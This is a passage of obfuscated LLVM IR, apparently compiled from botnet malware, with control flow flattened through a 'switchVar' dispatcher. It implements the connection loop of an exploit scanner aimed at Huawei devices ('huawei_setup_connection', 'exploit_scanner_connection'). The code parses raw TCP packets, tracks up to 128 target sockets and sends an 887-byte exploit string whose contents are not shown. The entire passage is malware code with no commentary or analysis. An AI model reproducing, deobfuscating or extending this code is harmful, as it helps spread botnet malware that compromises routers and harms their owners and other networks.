; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 6
  %262 = select i1 %261, i32 1128248009, i32 1724450696
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %266 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %265, i32 0, i32 0
  %267 = load i16, i16* %266, align 4
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %270 = zext i16 %269 to i32
  %271 = icmp ne i32 %268, %270
  %272 = select i1 %271, i32 -1558123510, i32 -276544570
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %276 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %275, i32 0, i32 1
  %277 = load i16, i16* %276, align 2
  %278 = zext i16 %277 to i32
  %279 = load i16, i16* %2, align 2
  %280 = zext i16 %279 to i32
  %281 = icmp ne i32 %278, %280
  %282 = select i1 %281, i32 -1988428642, i32 -581206102
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 9
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  %291 = select i1 %290, i32 1791567990, i32 -120714611
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = lshr i16 %296, 12
  %298 = and i16 %297, 1
  %299 = icmp ne i16 %298, 0
  %300 = select i1 %299, i32 1415579010, i32 -531686628
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = lshr i16 %305, 10
  %307 = and i16 %306, 1
  %308 = icmp ne i16 %307, 0
  %309 = select i1 %308, i32 1176358866, i32 832457256
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = lshr i16 %314, 8
  %316 = and i16 %315, 1
  %317 = icmp ne i16 %316, 0
  %318 = select i1 %317, i32 1537778472, i32 1470911834
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %322 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %321, i32 0, i32 3
  %323 = load i32, i32* %322, align 4
  %324 = call i32 @ntohl(i32 %323) #9
  %325 = sub i32 %324, 1
  %326 = call i32 @htonl(i32 %325) #9
  %327 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  %329 = load i32, i32* %328, align 4
  %330 = icmp ne i32 %326, %329
  %331 = select i1 %330, i32 -327747405, i32 -1765417572
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %334 = load i32, i32* %9, align 4
  store i32 %334, i32* %18, align 4
  store i32 -1901953966, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i32, i32* %18, align 4
  %337 = icmp slt i32 %336, 128
  %338 = select i1 %337, i32 -55481979, i32 1003446946
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %341 = load i32, i32* %18, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %340, i64 %342
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 2
  %345 = load i32, i32* %344, align 8
  %346 = icmp eq i32 %345, 0
  %347 = select i1 %346, i32 542729120, i32 1373408126
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %350 = load i32, i32* %18, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %349, i64 %351
  store %struct.exploit_scanner_connection* %352, %struct.exploit_scanner_connection** %22, align 8
  %353 = load i32, i32* %18, align 4
  store i32 %353, i32* %9, align 4
  store i32 1003446946, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  store i32 -435673514, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %18, align 4
  %357 = add nsw i32 %356, 1
  store i32 %357, i32* %18, align 4
  store i32 -1901953966, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %360 = icmp eq %struct.exploit_scanner_connection* %359, null
  %361 = select i1 %360, i32 -1166374030, i32 -1021552662
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 775885957, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 8
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %368 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %367, i32 0, i32 3
  store i32 %366, i32* %368, align 4
  %369 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %370 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %369, i32 0, i32 0
  %371 = load i16, i16* %370, align 4
  %372 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %373 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %372, i32 0, i32 4
  store i16 %371, i16* %373, align 8
  %374 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %374)
  store i32 337538817, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  store i32 2130574758, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %377, i64 0, i64 0
  %379 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %378) #6, !srcloc !3
  %380 = extractvalue { i64, i64* } %379, 0
  %381 = extractvalue { i64, i64* } %379, 1
  %382 = trunc i64 %380 to i32
  store i32 %382, i32* %24, align 4
  %383 = ptrtoint i64* %381 to i64
  %384 = trunc i64 %383 to i32
  store i32 %384, i32* %25, align 4
  store i32 -348381098, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 1187809990, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %388 = getelementptr inbounds [16 x i64], [16 x i64]* %387, i64 0, i64 0
  %389 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %388) #6, !srcloc !4
  %390 = extractvalue { i64, i64* } %389, 0
  %391 = extractvalue { i64, i64* } %389, 1
  %392 = trunc i64 %390 to i32
  store i32 %392, i32* %26, align 4
  %393 = ptrtoint i64* %391 to i64
  %394 = trunc i64 %393 to i32
  store i32 %394, i32* %27, align 4
  store i32 1836503564, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -888183147, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i32, i32* %1, align 4
  %398 = icmp slt i32 %397, 128
  %399 = select i1 %398, i32 -224512248, i32 -1747001684
  store i32 %399, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  store i32 5, i32* %28, align 4
  %401 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %402 = load i32, i32* %1, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %401, i64 %403
  store %struct.exploit_scanner_connection* %404, %struct.exploit_scanner_connection** %7, align 8
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 2
  %407 = load i32, i32* %406, align 8
  %408 = icmp ne i32 %407, 0
  %409 = select i1 %408, i32 1126486765, i32 1419836331
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i32, i32* @huawei_fake_time, align 4
  %412 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %413 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %412, i32 0, i32 1
  %414 = load i32, i32* %413, align 4
  %415 = sub i32 %411, %414
  %416 = load i32, i32* %28, align 4
  %417 = icmp ugt i32 %415, %416
  %418 = select i1 %417, i32 875234641, i32 1419836331
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %421 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = call i32 @close(i32 %422)
  %424 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %425 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %424, i32 0, i32 0
  store i32 -1, i32* %425, align 8
  %426 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %427 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %426, i32 0, i32 2
  store i32 0, i32* %427, align 8
  %428 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %429 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %428, i32 0, i32 6
  %430 = getelementptr inbounds [256 x i8], [256 x i8]* %429, i32 0, i32 0
  call void @util_zero(i8* %430, i32 256)
  store i32 -828592813, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %433 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %432, i32 0, i32 2
  %434 = load i32, i32* %433, align 8
  %435 = icmp eq i32 %434, 1
  %436 = select i1 %435, i32 2140795735, i32 1610192275
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %439 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %438, i32 0, i32 2
  %440 = load i32, i32* %439, align 8
  %441 = icmp eq i32 %440, 3
  %442 = select i1 %441, i32 2140795735, i32 -856971670
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %445 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %444, i32 0, i32 2
  %446 = load i32, i32* %445, align 8
  %447 = icmp eq i32 %446, 4
  %448 = select i1 %447, i32 2140795735, i32 2105535442
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %451 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 8
  %453 = srem i32 %452, 64
  %454 = zext i32 %453 to i64
  %455 = shl i64 1, %454
  %456 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %457 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %458 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %457, i32 0, i32 0
  %459 = load i32, i32* %458, align 8
  %460 = sdiv i32 %459, 64
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [16 x i64], [16 x i64]* %456, i64 0, i64 %461
  %463 = load i64, i64* %462, align 8
  %464 = or i64 %463, %455
  store i64 %464, i64* %462, align 8
  %465 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %466 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 8
  %468 = load i32, i32* %12, align 4
  %469 = icmp sgt i32 %467, %468
  %470 = select i1 %469, i32 -1558612826, i32 1390334045
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %473 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  store i32 %474, i32* %12, align 4
  store i32 1390334045, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  store i32 -1927175277, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %478 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %477, i32 0, i32 2
  %479 = load i32, i32* %478, align 8
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 1897599822, i32 -2105481290
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %484 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 8
  %486 = srem i32 %485, 64
  %487 = zext i32 %486 to i64
  %488 = shl i64 1, %487
  %489 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %490 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %491 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 8
  %493 = sdiv i32 %492, 64
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [16 x i64], [16 x i64]* %489, i64 0, i64 %494
  %496 = load i64, i64* %495, align 8
  %497 = or i64 %496, %488
  store i64 %497, i64* %495, align 8
  %498 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %499 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 8
  %501 = load i32, i32* %11, align 4
  %502 = icmp sgt i32 %500, %501
  %503 = select i1 %502, i32 -1624003834, i32 -458982195
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %506 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 8
  store i32 %507, i32* %11, align 4
  store i32 -458982195, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 -2105481290, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  store i32 -1927175277, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  store i32 -828592813, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %1, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %1, align 4
  store i32 -888183147, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %515, align 8
  %516 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %516, align 8
  %517 = load i32, i32* %12, align 4
  %518 = load i32, i32* %11, align 4
  %519 = icmp sgt i32 %517, %518
  %520 = select i1 %519, i32 -1638939909, i32 1284288329
  store i32 %520, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i32, i32* %12, align 4
  store i32 -1866202678, i32* %switchVar
  store i32 %522, i32* %.reg2mem2
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %11, align 4
  store i32 -1866202678, i32* %switchVar
  store i32 %524, i32* %.reg2mem2
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %526 = add nsw i32 1, %.reload3
  %527 = call i32 @select(i32 %526, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %527, i32* %13, align 4
  %528 = call i64 @time(i64* null) #6
  %529 = trunc i64 %528 to i32
  store i32 %529, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  store i32 1470361564, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32, i32* %1, align 4
  %532 = icmp slt i32 %531, 128
  %533 = select i1 %532, i32 -370703897, i32 1524889327
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %536 = load i32, i32* %1, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %535, i64 %537
  store %struct.exploit_scanner_connection* %538, %struct.exploit_scanner_connection** %7, align 8
  %539 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %540 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %539, i32 0, i32 0
  %541 = load i32, i32* %540, align 8
  %542 = icmp eq i32 %541, -1
  %543 = select i1 %542, i32 207064749, i32 -2031563416
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  store i32 -1810917463, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %547 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %548 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 8
  %550 = sdiv i32 %549, 64
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds [16 x i64], [16 x i64]* %546, i64 0, i64 %551
  %553 = load i64, i64* %552, align 8
  %554 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %555 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %554, i32 0, i32 0
  %556 = load i32, i32* %555, align 8
  %557 = srem i32 %556, 64
  %558 = zext i32 %557 to i64
  %559 = shl i64 1, %558
  %560 = and i64 %553, %559
  %561 = icmp ne i64 %560, 0
  %562 = select i1 %561, i32 659196393, i32 372221795
  store i32 %562, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %564 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %565 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 8
  %567 = bitcast i32* %29 to i8*
  %568 = call i32 @getsockopt(i32 %566, i32 1, i32 4, i8* %567, i32* %31) #6
  store i32 %568, i32* %30, align 4
  %569 = load i32, i32* %29, align 4
  %570 = icmp eq i32 %569, 0
  %571 = select i1 %570, i32 -440046523, i32 -676895842
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i32, i32* %30, align 4
  %574 = icmp eq i32 %573, 0
  %575 = select i1 %574, i32 -1103302605, i32 -676895842
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %578 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %577, i32 0, i32 2
  %579 = load i32, i32* %578, align 8
  %580 = icmp eq i32 %579, 3
  %581 = select i1 %580, i32 2027771205, i32 -477068453
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %583, i32 0, i32 8
  %585 = getelementptr inbounds [2560 x i8], [2560 x i8]* %584, i32 0, i32 0
  %586 = call i32 @util_strcpy(i8* %585, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i32 0, i32 0))
  %587 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %588 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %587, i32 0, i32 0
  %589 = load i32, i32* %588, align 8
  %590 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %590, i32 0, i32 8
  %592 = getelementptr inbounds [2560 x i8], [2560 x i8]* %591, i32 0, i32 0
  %593 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %593, i32 0, i32 8
  %595 = getelementptr inbounds [2560 x i8], [2560 x i8]* %594, i32 0, i32 0
  %596 = call i32 @util_strlen(i8* %595)
  %597 = sext i32 %596 to i64
  %598 = call i64 @send(i32 %589, i8* %592, i64 %597, i32 16384)
  %599 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %600 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %599, i32 0, i32 8
  %601 = getelementptr inbounds [2560 x i8], [2560 x i8]* %600, i32 0, i32 0
  call void @util_zero(i8* %601, i32 2560)
  %602 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %603 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %602, i32 0, i32 6
  %604 = getelementptr inbounds [256 x i8], [256 x i8]* %603, i32 0, i32 0
  call void @util_zero(i8* %604, i32 256)
  %605 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %606 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %605, i32 0, i32 2
  store i32 4, i32* %606, align 8
  store i32 -1810917463, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %609 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %608, i32 0, i32 2
  %610 = load i32, i32* %609, align 8
  %611 = icmp eq i32 %610, 4
  %612 = select i1 %611, i32 1811817089, i32 -1746424923
  store i32 %612, i32* %switchVar
  br label %loopEnd

; <label>:613:                                    ; preds = %loopEntry
  %614 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %615 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %614, i32 0, i32 0
  %616 = load i32, i32* %615, align 8
  %617 = call i32 @close(i32 %616)
  %618 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %618, i32 0, i32 0
  store i32 -1, i32* %619, align 8
  %620 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %621 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %620, i32 0, i32 2
  store i32 0, i32* %621, align 8
  store i32 -1810917463, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %624 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %623, i32 0, i32 2
  store i32 3, i32* %624, align 8
  store i32 -283559082, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 788385367, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  store i32 157213748, i32* %switchVar
  br label %loopEnd

; <label>:627:                                    ; preds = %loopEntry
  %628 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %629 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 8
  %631 = call i32 @close(i32 %630)
  %632 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %633 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %632, i32 0, i32 0
  store i32 -1, i32* %633, align 8
  %634 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %634, i32 0, i32 2
  store i32 0, i32* %635, align 8
  store i32 -1810917463, i32* %switchVar
  br label %loopEnd

; <label>:636:                                    ; preds = %loopEntry
  store i32 372221795, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %639 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %640 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %639, i32 0, i32 0
  %641 = load i32, i32* %640, align 8
  %642 = sdiv i32 %641, 64
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds [16 x i64], [16 x i64]* %638, i64 0, i64 %643
  %645 = load i64, i64* %644, align 8
  %646 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %647 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %646, i32 0, i32 0
  %648 = load i32, i32* %647, align 8
  %649 = srem i32 %648, 64
  %650 = zext i32 %649 to i64
  %651 = shl i64 1, %650
  %652 = and i64 %645, %651
  %653 = icmp ne i64 %652, 0
  %654 = select i1 %653, i32 742881569, i32 -1799417243
  store i32 %654, i32* %switchVar
